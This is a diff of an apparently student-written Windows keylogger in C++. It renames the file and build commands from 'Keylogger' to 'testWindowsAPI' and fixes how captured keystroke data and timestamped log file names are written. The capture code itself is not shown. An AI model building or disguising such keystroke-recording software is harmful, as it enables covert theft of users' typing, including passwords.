@@ -1,11 +1,12 @@
 /*----------------------------------------------------------------
+ *  Nama File : testWindowsAPI.cpp
  *  Author:     1.  Febi Agil Ifdillah - 13514010 (3514010@std.stei.itb.ac.id)
- 		2.  Rio Chandra - 13514082 (13514082@std.stei.itb.ac.id)
+ 				2.  Rio Chandra - 13514082 (13514082@std.stei.itb.ac.id)
  *  Written:       28/1/2016
  *  Last updated:  31/1/2016
  *
- *  Compilation:   g++ -o Keylogger Keylogger.cpp
- *  Execution:     ./Keylogger
+ *  Compilation:   g++ -o testWindowsAPI testWindowsAPI.cpp
+ *  Execution:     ./testWindowsAPI
  *
  *----------------------------------------------------------------*/
 
@@ -160,7 +161,7 @@ void TulisKeFile(){
 		abort();
 	}
 	//menulis string yang ada di dataRekam ke outfile.
-	outfile << dataRekam.c_str();
+	outfile << dataRekam;
 
 	// menutup berkas
 	outfile.close();
@@ -237,18 +238,18 @@ void mulaiRekam(){
 	//konversi dari integer ke string
 	stringstream syear, smon,sday,shour, smin,ssec;
 	int year=1900+ltm->tm_year;
-	int mon=1 + ltm->tm_mon;
+	int mon=1 + ltm->tm_mon ;
 	int day=ltm->tm_mday;
-	int hour=1 + ltm->tm_hour;
-	int min=1 + ltm->tm_min;
-	int sec=1 + ltm->tm_sec;
+	int hour= ltm->tm_hour;
+	int min=ltm->tm_min;
+	int sec=ltm->tm_sec;
 	syear << year; string stryear=syear.str();
-	smon << mon; string strmon=smon.str();
-	sday << day; string strday=sday.str();
-	shour << hour; string strhour=shour.str();
-	smin << min; string strmin=smin.str();
-	ssec << sec; string strsec=ssec.str();
-	tanggalWaktu = stryear+strday+strhour+'-'+strhour+strmin+strsec;
+	smon << mon; string strmon=smon.str(); strmon = strmon.length() == 1 ? "0" + strmon : strmon;
+	sday << day; string strday=sday.str(); strday = strday.length() == 1 ? "0" + strday : strday;
+	shour << hour; string strhour=shour.str(); strhour = strhour.length() == 1 ? "0" + strhour : strhour;
+	smin << min; string strmin=smin.str(); strmin = strmin.length() == 1 ? "0" + strmin : strmin;
+	ssec << sec; string strsec=ssec.str(); strsec = strsec.length() == 1 ? "0" + strsec : strsec;
+	tanggalWaktu = stryear+strmon+strday+'-'+strhour+strmin+strsec;
 	filename = tanggalWaktu + ".txt";
 
 	// vkCode adalah variabel yang menyimpan keyCode yang diinput pengguna
